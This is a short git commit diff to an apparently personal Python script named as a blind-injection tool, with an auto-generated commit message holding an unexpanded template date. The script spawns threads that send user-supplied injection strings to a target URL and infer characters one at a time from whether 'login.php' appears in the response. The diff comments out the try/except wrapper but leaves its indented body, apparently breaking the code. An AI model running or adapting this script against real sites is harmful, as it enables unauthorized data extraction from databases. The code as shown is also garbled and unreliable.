e06f5c06d10a98d2557b4b7221f64a8121b75be0
whb54012 <1226844928@qq.com>
2026-07-28 01:47:35 +0000

    自动提交：更新 ${2026/7/28 09:47ilenAM47e}

--- python/盲注脚本.py
+++ python/盲注脚本.py
@@ -9,15 +9,15 @@ url = input("输入url及注入点")
 data=input("输入注入语句")
 # data='?c=11{}{}123'
 def fun(url,result,result2):
-    try:
+    # 
         for i in range(result2):
             reponse=requests.get(url+data.format(result,i),timeout=1)
             if 'login.php' in reponse.text:
                 print(result,chr(i)+"\n")
                 break
         return
-    except:
-        pass
+    # except:
+    #     pass
 for  i in range(result):
     t=threading.Thread(target=fun,args=(url,i,150))
     t.start()
